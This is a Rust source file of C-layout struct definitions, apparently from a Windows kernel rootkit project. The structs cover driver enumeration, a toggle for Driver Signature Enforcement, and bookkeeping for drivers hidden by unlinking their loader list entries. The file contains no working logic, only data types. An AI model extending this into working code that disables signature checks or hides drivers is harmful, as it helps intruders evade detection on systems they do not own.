use core::sync::atomic::AtomicPtr;
use super::LIST_ENTRY;
use ntapi::ntldr::LDR_DATA_TABLE_ENTRY;

// Enumerate Drivers
#[repr(C)]
pub struct DriverInfo {
    pub address: usize,
    pub name: [u16; 256],
    pub index: u8,
}

// Enable / Disable DSE
#[repr(C)]
#[derive(Debug)]
pub struct DSE {
    pub enable: bool
}

// Structure that stores the values of the process that has been hidden
#[repr(C)]
#[derive(Debug)]
pub struct HiddenDriverInfo  {
    pub name: alloc::string::String,
    pub list_entry: AtomicPtr<LIST_ENTRY>,
    pub driver_entry: AtomicPtr<LDR_DATA_TABLE_ENTRY>,
}

// Represents a drivers information, including its name and a flag indicating whether it should be hidden or not
#[repr(C)]
#[derive(Debug, Default)]
pub struct TargetDriver {
    pub name: alloc::string::String,
    pub enable: bool,
}
